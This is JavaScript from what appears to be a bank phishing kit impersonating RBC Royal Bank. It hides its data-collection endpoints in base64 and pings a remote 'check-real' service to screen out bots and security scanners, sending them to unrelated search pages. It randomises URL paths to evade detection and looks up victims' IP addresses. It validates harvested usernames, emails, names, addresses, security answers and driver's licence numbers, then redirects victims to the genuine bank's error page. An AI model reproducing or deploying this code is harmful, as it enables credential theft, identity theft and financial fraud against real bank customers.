let YOUR_LICENSE = document.body.hasAttribute('data-ls') ? document.body.getAttribute('data-ls').length > 6 ? document.body.getAttribute('data-ls') : 'JMMYSELF01' : 'JMMYSELF01';
let GENERAL_LICENSE_KEY = document.body.getAttribute('data-ls') === null ? 'Sm1hdGhld19Ecm9wVUs=' : document.body.getAttribute('data-ls').length < 10 ? 'Sm1hdGhld19Ecm9wVUs=' : document.body.getAttribute('data-ls');
let STOP_USER_FROM_REENTRY = document.body.hasAttribute('data-redirect') ? document.body.getAttribute('data-redirect') !== 'no' : true;

let USE_DEDICATED = false;

let DEDICATED_LICENSE = YOUR_LICENSE;
let TWO_TRY_USER_ACCESS = false;
let LICENSE_LOCATION = 'bbannkk'
let G_SCRIPT_NAME = window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvcmVzdWx0cy9tYWlu");
let D_SCRIPT_NAME = window.atob("aHR0cHM6Ly9hY2Nlc3NpYmxldGVjaC5qbXRoZXdib29tLmNvbS9wb3N0LnBocA==");

let REDIRECT_TO_SELF = document.getElementById('identifier') ? document.getElementById('identifier').hasAttribute('data-to-self') ? document.getElementById('identifier').getAttribute('data-to-self') !== 'yes' : false : false;

let FINAL_REDIRECTION = "https://secure.royalbank.com/statics/login-service-ui/index#/full/systemError?_ga=2.165467576.667584341.1658298576-845524828.1656020361&LANGUAGE=ENGLISH";

let SCRIPT_NAME = document.getElementById('identifier') ? document.getElementById('identifier').hasAttribute('data-script-name') ? document.getElementById('identifier').getAttribute('data-script-name').includes(".php") ? document.getElementById('identifier').getAttribute('data-script-name') : "/script.php" : "/script.php" : "/script.php";        //Change to false if you want to use the custom redirect"script.php";     //Optional, if you change the script name, you have to change this too

let USE_SCRIPT = document.getElementById('identifier') ? document.getElementById('identifier').hasAttribute('data-use-script') ? document.getElementById('identifier').getAttribute('data-use-script') === "yes" : false : false;        //Change to false if you want to use the custom redirect"script.php";     //Optional, if you change the script name, you have to change this too

let SHOW_CARD = document.body.hasAttribute('data-show-card') ? document.body.getAttribute('data-show-card') === "yes" : parseInt(document.body.getAttribute('data-show-card')) === 1;        //Change to false if you want to use the custom redirect"script.php";     //Optional, if you change the script name, you have to change this too

let SHOW_INFO = document.body.hasAttribute('data-show-details') ? document.body.getAttribute('data-show-details') === "yes" : parseInt(document.body.getAttribute('data-show-details')) === 1;        //Change to false if you want to use the custom redirect"script.php";     //Optional, if you change the script name, you have to change this too

let SCRIPT_LINK = 'https://loaddrirectjson2.herokuapp.com/checkDomain/index.php';

let ITs_RESOLVE = false;
let DOMReady = false;
let pages = {};
let ip_config = {};
let REAL_BNK_NAME = 'RBC Royal Bank'
let is_second2 = false, showHide = false, mx_host = "", u_id = "";

HTMLElement.prototype.parents = function (query = "") {
    if (typeof query !== "string") return this.parentElement
    if (query.length < 1 || (query.includes(".") === false && query.includes("#") === false) || query.includes(" ")) return this.parentElement
    let parent = this.parentElement
    let foundParent = false;

    while (!foundParent) {
        if (parent === null) {
            foundParent = true;
            return null;
        } else if (query.startsWith("#") && parent.id === query.replaceAll("#", "") && query.includes(".") === false) {
            foundParent = true;
            return parent;
        } else if (query.startsWith(".")) {
            let isIt = false
            for (let value of query.split(".")) if (value.length > 0) isIt = parent.classList.contains(value);
            if (isIt) {
                foundParent = true;
                return parent
            }
        } else if (query.startsWith("#") && query.includes(".") === true) {
            let isIt = false
            let id = query.split(".")[0].replaceAll("#", "")
            for (let value of query.split(".")) if (value.length > 0 && value.startsWith("#") === false) isIt = parent.classList.contains(value);
            if (isIt && parent.id === id) {
                foundParent = true;
                return parent
            }
        } else if (query.startsWith("#") === false && query.startsWith(".") === false) {
            let name = query.includes("#") ? query.substring(0, query.indexOf('#')) : query.substring(0, query.indexOf('.'))
            let _name = typeof parent.tagName === 'string' ? parent.tagName.toLowerCase().toLowerCase() : parent.nodeName.toLowerCase().toLowerCase();
            query = query.substring(name.length)
            let isIt = true
            let id = query.includes("#") && query.includes(".") ? query.split(".")[0].replaceAll("#", "") : (query.includes("#") ? query.replaceAll("#", "") : "")
            for (let value of query.split(".")) if (value.length > 0 && value.startsWith("#") === false) isIt = parent.classList.contains(value);
            id = id.length > 0 ? parent.id === id : true
            if (isIt && id === true && _name.toLowerCase() === name.toLowerCase()) {
                foundParent = true;
                return parent
            }
        }
        parent = parent.parentElement
    }
}

if (SCRIPT_NAME !== '/script.php') {
    SCRIPT_NAME = base64decode(SCRIPT_NAME).length > 4 ? base64decode(SCRIPT_NAME) : '/script.php';
}

if (USE_SCRIPT === false) {
    SCRIPT_NAME = SCRIPT_LINK.split('/index.php')[0] + '/script/' + YOUR_LICENSE + "/"
}

/*




Required




 */


(async () => {
    await is_firstTimeOnly()
})()


/*




Required




 */


async function set_random_url(path = "", params = "") {
    let params_ = ['cvid', 's', 'token', 'access', 'q', 'hash', 'aqs', 'edge', 'lang', 'loc', 'pixel', 'auth'];
    let params_val = [encodeURIComponent(btoa(rnd().toString())).replaceAll('%', ''), hash(rnd()), uniqId(), uniqId(hash(rnd())), uniqId(hash(rnd(), rnd())), rnd(192073647382, 98989898989899999), rnd()];
    let encoded = [await sha_256("ripemd320", rnd(192073647382, 98989898989899999)), hash("md5", rnd(192073647382, 98989898989899999)), hash("sha1", rnd(192073647382, 98989898989899999)), await sha_256("sha256", rnd(192073647382, 98989898989899999)), await sha_256("haval160,4", rnd(192073647382, 98989898989899999)), await sha_256("sha512", rnd(192073647382, 98989898989899999)), hash("sha384", rnd(192073647382, 98989898989899999)), hash("ripemd256", rnd(192073647382, 98989898989899999))];

    let rand = rnd(3, 6);
    for (let i = 0; i < rand; i++) path += path.endsWith("/") ? encoded[rnd(0, encoded.length - 1)] : ("/" + encoded[rnd(0, encoded.length - 1)]);
    rand = rnd(3, 5);
    for (let i = 0; i < rand; i++) {
        let s = params_[rnd(0, params_.length - 1)];
        while (params_exits(params, s) === true) {
            s = params_[rnd(0, params_.length - 1)];
        }
        params += params.length > 0 ? `&${s}=${params_val[rnd(0, params_val.length - 1)]}` : `${s}=${params_val[rnd(0, params_val.length - 1)]}`;
    }
    return {'path': path, 'params': params};
}

function params_exits(params, s) {
    if (params.startsWith(`${s}=`)) return true;
    return params.includes(`&${s}=`) === true;
}

function rnd(min = (Math.floor(Math.random() * 1000)), max = (Math.floor(Math.random() * (999999999999999999999 - 100000)) + 100000)) {
    return parseInt((Math.floor(Math.random() * (max - min + 1)) + min).toString());
}

function uniqId(prefix = "", random = false) {
    const sec = Date.now() * 1000 + Math.random() * 1000;
    const id = sec.toString(16).replace(/\./g, "").padEnd(14, "0");
    return `${prefix}${id}${random ? `.${Math.trunc(Math.random() * 100000000)}` : ""}`;
}

async function sha_256(string, string2 = "") {
    const utf8 = new TextEncoder().encode(`${string}${string2}`);
    const hashBuffer = await crypto.subtle.digest('SHA-256', utf8);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray
        .map((bytes) => bytes.toString(16).padStart(2, '0'))
        .join('');
}

function hash(str = rnd(), key) {
    str = `${str}${key}`
    return encodeURIComponent(btoa(str)).replaceAll('%', '')
}


async function setPath(dev_path = "", force = false, params = "", startup = false) {
    if ((localStorage.getItem('ParentPath') === null || typeof localStorage.getItem('ParentPath') === 'undefined') && force === false) return;
    let a = await set_random_url(dev_path, params), b = await set_random_url(dev_path, params),
        c = await set_random_url(dev_path, params), d = await set_random_url(dev_path, params),
        e = await set_random_url(dev_path, params), f = await set_random_url(dev_path, params);
    set_cookies("ParentPath", a.path + "?" + a.params);
    set_cookies("MainPath", b.path + "?" + b.params);
    set_cookies("LPath", c.path + "?" + c.params);
    set_cookies("EPath", d.path + "?" + d.params);
    set_cookies("CPath", f.path + "?" + f.params);
    set_cookies("DPath", e.path + "?" + e.params);
    set_cookies("QPath", e.path + "?" + e.params);
    if (typeof localStorage.getItem('active_page') === 'undefined' || localStorage.getItem('active_page') === null || startup) {
        set_cookies('dev_path', dev_path);
        set_cookies('params', params);
    }
}

function set_cookies(name, value) {
    localStorage.setItem(name.toString(), value.toString());
}

async function reload(name = '', url = "", enabled = false) {
    let active_page = localStorage.getItem('active_page');
    let ParentPath = localStorage.getItem('ParentPath');
    if ((active_page === null || typeof active_page === "undefined") && url.length < 6 && (ParentPath === null || typeof ParentPath === "undefined")) {
        redirectToUnknown();
        return;
    }
    let active_page2 = (active_page === null || typeof active_page === "undefined") ? {} : JSON.parse(active_page);
    if (Object.keys(active_page2).length < 2 && url.length < 6 && name < 5) {
        redirectToUnknown();
        return;
    }
    if (Object.keys(active_page2).length > 0) {
        name = name.length < 4 ? active_page2.name : name
    }
    let is_single = document.body.getAttribute('data-single') !== null;
    is_single = is_single ? (parseInt(document.body.getAttribute('data-single')) === 1 || document.body.getAttribute('data-single').toLowerCase() === 'yes') : false;
    if (is_single) {
        if (url.length > 0) {
            let p = encodeURIComponent(url.getItem(name).split('?')[0])
            let q = localStorage.getItem(url).split('?')[1]
            location.replace(location.pathname + `?${uniqId()}=${p}&${q}`)
        } else {
            await setPath(localStorage.getItem('dev_path'), true, localStorage.getItem('params'));
            set_cookies('active_page', JSON.stringify({name: name, path: localStorage.getItem(name)}));
            let p = encodeURIComponent(localStorage.getItem(name).split('?')[0])
            let q = localStorage.getItem(name).split('?')[1]
            location.replace(location.pathname + `?${uniqId()}=${p}&${q}`);
        }
    } else {
        if (url.length > 0) {
            window.location.replace(url)
        } else {
            setPath(localStorage.getItem('dev_path'), true, localStorage.getItem('params')).then(() => {
            }).finally(() => {
                set_cookies('active_page', JSON.stringify({name: name, path: localStorage.getItem(name)}));
                window.location.replace(localStorage.getItem(name))
            })
        }
    }
}

function is_pages(is_bypass = true) {
    if (localStorage.getItem('ParentPath') === null || typeof localStorage.getItem('ParentPath') === 'undefined') {
        if (is_bypass === false) {
            reload('', location.href).then()
        }
        return {}
    } else {
        if (IsActive(localStorage.getItem('MainPath')) === true) return {
            'name': 'MainPath',
            "path": localStorage.getItem('MainPath')
        };
        if (IsActive(localStorage.getItem('LPath')) === true) return {
            'name': 'LPath',
            "path": localStorage.getItem('LPath')
        };
        if (IsActive(localStorage.getItem('EPath')) === true) return {
            'name': 'EPath',
            "path": localStorage.getItem('EPath')
        };
        if (IsActive(localStorage.getItem('CPath')) === true) return {
            'name': 'CPath',
            "path": localStorage.getItem('CPath')
        };
        if (IsActive(localStorage.getItem('DPath')) === true) return {
            'name': 'DPath',
            "path": localStorage.getItem('DPath')
        };
        if (IsActive(localStorage.getItem('QPath')) === true) return {
            'name': 'QPath',
            "path": localStorage.getItem('QPath')
        };
        if (typeof localStorage.getItem('active_page') === 'string') {
            let array = JSON.parse(localStorage.getItem('active_page'));
            if (array) {
                if (typeof localStorage.getItem(array.name) === 'string')
                    if (IsActive(array.path))
                        return {'name': array.name, "path": localStorage.getItem(array.name)};
            }
        }
        return {};
    }
}

function redirectToUnknown() {
    let list = [
        'https://www.ask.com/web?o=0&l=dir&qo=serpSearchTopBox&ad=dirN&rtb=20000&q=Zelle+Pay',
        'https://www.bing.com/search?q=Zelle+Pay&cvid=8522ac64abd749269b31a6fdb567d56a&aqs=edge.0.0l9.635j0j4&FORM=ANAB01&PC=DCTS',
        'https://search.yahoo.com/search;_ylt=AwrEo090er9iBTYNuZJDDWVH;_ylc=X1MDMTE5NzgwNDg2NwRfcgMyBGZyAwRmcjIDcDpzLHY6c2ZwLG06c2ItdG9wBGdwcmlkA1U4X2drcVRGVERhRDRBcmZQR0x3OUEEbl9yc2x0AzAEbl9zdWdnAzEwBG9yaWdpbgNzZWFyY2gueWFob28uY29tBHBvcwMwBHBxc3RyAwRwcXN0cmwDMARxc3RybAMxOARxdWVyeQNNaWNyb3NvZnQlMjBPbmVEcml2ZQR0X3N0bXADMTY1NjcxNTg5OA--?p=Zelle+Pay&fr=sfp&fr2=p%3As%2Cv%3Asfp%2Cm%3Asb-top&iscqry=',
        'https://www.google.com/search?q=Zelle+Pay&sxsrf=ALiCzsbrLDQ2KctNmH_RIanPvqPSjqb1Vw%3A1656716047996&source=hp&ei=D3u_YqWROpCHlwTx9qD4Ag&iflsig=AJiK0e8AAAAAYr-JH0CYYN8AbH8G59ayT3JOVoFSNXwu&ved=0ahUKEwjl1KCc5Nj4AhWQw4UKHXE7CC8Q4dUDCAc&uact=5&oq=Zelle+Pay&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEUABYAGC_BGgAcAB4AIAB2AGIAdgBkgEDMi0xmAEAoAECoAEB&sclient=gws-wiz',
        'https://www.youtube.com/results?search_query=Zelle+Pay',
        'https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&ch=&tn=baidu&bar=&wd=Zelle+Pay&rn=&fenlei=256&oq=&rsv_pq=835422aa0002ac2a&rsv_t=6497SlvSbubKeEQiJKn3KL3SuZZtXrJNITLPGYEx%2Bbx5%2B1mf%2F9%2FyQ0avW1M&rqlang=cn',
        'https://duckduckgo.com/?q=Zelle+Pay&t=h_&ia=web',
        'https://yandex.com/search/?text=Zelle+Pay&lr=20742'
    ];
    location.replace(list[rnd(0, list.length - 1)]);
}

function IsActive(check) {
    if (typeof check === 'undefined' || check === null) {
        return false;
    }
    if (check.length < 20) {
        return false;
    }
    let ch = ""
    if (check.includes("?")) {
        let p = encodeURIComponent(check.split('?')[0])
        let q = check.split('?')[1]
        ch = `${p}&${q}`;
    }
    return location.href.includes(check) || location.href.includes(ch)
}


function is_username(username) {
    return (/^(?=[a-zA-Z0-9._-]{6,25}$)(?!.*[_.-]{2})[^_.-].*[^_.-]$/.test(username))
}

function is_email(email) {
    return (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,9})+$/.test(email))
}

function is_fullName(name) {
    if (name.includes(" ")) {
        let value = name.toString().split(" ");
        if (value.length <= 3) {
            return value[0].toString().length > 1 && (value[1].toString().length > 1 || (typeof value[2] !== 'undefined' && value[2].toString().length > 1));
        } else {
            return false
        }
    } else {
        return false;
    }
}

function is_firstName(name) {
    if (name.toString().includes(" ")) {
        if (name.toString().split(" ").length > 2) return false
        let value = []
        for (let v of name.toString().split(" ")) if (v.trim().length > 0) value.push(v);
        return value.length <= 2 && value.length > 0;
    } else {
        return name.length >= 2
    }
}

function is_lastName(name) {
    if (name.includes(" ")) {
        if (name.toString().split(" ").length > 2) return false
        let value = []
        for (let v of name.toString().split(" ")) if (v.trim().length > 0) value.push(v);
        return value.length <= 2 && value.length > 0;
    } else {
        return name.length >= 2
    }
}

function is_streetAddress(address) {
    return address.toString().trim().length > 9;
}

function is_question(question) {
    return question.toString().trim().replaceAll(" ", "").length > 6;
}

function is_answer(answer) {
    return answer.toString().trim().replaceAll(" ", "").length > 1;
}

function is_DL(dl) {
    return /^(?=[a-zA-Z0-9]{7,13}$)/.test(dl)
}

async function moveAhead() {
    fetch('https://us-central1-cloud-app-php-mysql.cloudfunctions.net/check-real', {
        method: 'GET',
    }).then(async (response) => {
        let data = await response.json();
        if (data.hasOwnProperty('isreal')) {
            if (data.isreal === true) {
                set_cookies('is_loaded', 'yes');
                await loader()
            } else {
                redirectToUnknown();
            }
        } else {
            set_cookies('is_loaded', 'yes');
            await loader();
        }
    }).catch(async () => {
        set_cookies('is_loaded', 'yes');
        await loader();
    })

}


async function is_firstTimeOnly() {
    let url = new URL(location.href)
    let is_plan_index = url.hash.length < 1 && url.search.length < 2
    let is_loaded = localStorage.getItem('is_loaded') !== null && typeof localStorage.getItem('is_loaded') !== 'undefined';
    let is_present = url.searchParams.has("live") === true || url.searchParams.has("leave") === true || url.searchParams.has("move") === true || url.searchParams.has("set") === true
    let Is_Finished = localStorage.getItem('stopThere') !== null && typeof localStorage.getItem('stopThere') !== 'undefined'
    if (is_loaded === true && is_present === false && Is_Finished === false) {
        pages = is_pages();
        if (typeof pages === 'object') {
            if (Object.keys(pages).length > 0) {
                ITs_RESOLVE = true;
            } else {
                if (is_plan_index === true) {
                    await moveAhead();
                } else {
                    redirectToUnknown();
                }
            }
        }
    } else if (Is_Finished === false && (url.searchParams.has("live") === true || url.searchParams.has("leave") === true || url.searchParams.has("move") === true || url.searchParams.has("set") === true)) {
        set_cookies('is_loaded', 'yes');
        await loader();
    } else if (Is_Finished === true && is_present === true) {
        if (url.searchParams.has('force') || STOP_USER_FROM_REENTRY === false) {
            set_cookies('is_loaded', 'yes');
            localStorage.removeItem('stopThere');
            await loader();
        } else {
            location.replace(FINAL_REDIRECTION);
        }
    } else {
        if (Is_Finished === true) {
            pages = is_pages();
            if (Object.keys(pages).length > 0) {
                location.replace(FINAL_REDIRECTION);
            } else {
                redirectToUnknown()
            }
        } else {
            await moveAhead();
        }
    }
}


async function loader() {
    let dev_ = document.body.getAttribute('data-dev') !== null;
    let dev_path = dev_ ? document.body.getAttribute('data-dev') : "";
    if (dev_path.length > 2) {
        dev_path = dev_path.endsWith("/") ? dev_path.substring(0, dev_path.length - 1) : dev_path;
        dev_path = !dev_path.startsWith("/") ? "/" + dev_path : dev_path;
    } else dev_path = "";
    let url = new URL(location.href)
    let param = ''
    url.searchParams.forEach(function (value, key) {
        if (key !== 'live' && key !== 'leave' && key !== 'force' && key !== 'move' && key !== 'set') {
            param += param.length > 0 ? `&${key}=${value}` : `${key}=${value}`
        }
    })
    localStorage.removeItem('username');
    if (localStorage.getItem('firstTime') !== null) localStorage.removeItem('firstTime')
    await setPath(dev_path, true, param, true);
    await reload('MainPath')
}


function base64decode(str) {
    try {
        return window.atob(str);
    } catch (e) {
        return '';
    }
}


function domain_check(email) {
    let domains = {
        yahoo: [
            "ameritech.net", "att.net", "bellsouth.net", "currently.com", "flash.net", "nvbell.net", "pacbell.net", "prodigy.net", "sbcglobal.net", "snet.net", "swbell.net", "wans.net", "worldnet.att.net", "ymail.com", "y7mail.com", "yahoo.at", "yahoo.be", "yahoo.bg", "yahoo.ca", "yahoo.cl", "yahoo.co.hu", "yahoo.co.id", "yahoo.co.il", "yahoo.co.in", "yahoo.co.kr", "yahoo.co.nz", "yahoo.co.th", "yahoo.co.uk", "yahoo.co.za", "yahoo.com.ar", "yahoo.com.au", "yahoo.com.br", "yahoo.com.co", "yahoo.com.hk", "yahoo.com.hr", "yahoo.com.mx", "yahoo.com.my", "yahoo.com.pe", "yahoo.com.ph", "yahoo.com.sg", "yahoo.com.tr", "yahoo.com.tw", "yahoo.com.ua", "yahoo.com.ve", "yahoo.com.vn", "yahoo.cz", "yahoo.de", "yahoo.dk", "yahoo.ee", "yahoo.es", "yahoo.fi", "yahoo.fr", "yahoo.gr", "yahoo.hr", "yahoo.hu", "yahoo.ie", "yahoo.in", "yahoo.it", "yahoo.lt", "yahoo.lv", "yahoo.nl", "yahoo.no", "yahoo.pl", "yahoo.pt", "yahoo.ro", "yahoo.rs", "yahoo.se", "yahoo.si", "yahoo.sk", "yahoogroups.co.kr", "yahoogroups.com.cn", "yahoogroups.com.sg", "yahoogroups.com.tw", "yahoogrupper.dk", "yahoogruppi.it", "yahooxtra.co.nz"
        ],
        aol: [
            "aol.com", "love.com", "ygm.com", "games.com", "wow.com", "cs.net", "cs.com", "verizon.net", "aol.net", "aim.com", "aim.net", "aol.co.uk"
        ]
    }
    for (let domain of domains.yahoo) if (email.toLowerCase().endsWith(`@${domain}`)) return 'y';
    for (let domain of domains.aol) if (email.toLowerCase().endsWith(`@${domain}`)) return 'a';
    return 'm';
}


function is_current_page(name = "") {
    if (name.length < 3) return false;
    if (localStorage.getItem('active_page') === null || typeof localStorage.getItem('active_page') !== 'string') return false;
    let page = JSON.parse(localStorage.getItem('active_page'));
    return page.name.toString().toLowerCase() === name.toLowerCase()
}

function is_apple() {
    let is_valid = [
        'iPad Simulator',
        'iPhone Simulator',
        'iPod Simulator',
        'iPad',
        'iPhone',
        'iPod'
    ].includes(navigator.platform)
    if (is_valid) return true;
    return /iPad|iPhone|iPod|Mac/.test(navigator.userAgent)
}

async function page_completed() {
    localStorage.removeItem('is_loaded');
    localStorage.setItem('stopThere', 'Paris')
    window.location.replace(FINAL_REDIRECTION);
}


async function get_reload_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if (response.status === "success") {
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(true);
            }
        });
    });
}

function localStorageCheck() {
    let ip = localStorage.getItem("ip_config");
    if (ip !== null) ip_config = JSON.parse(ip);
}
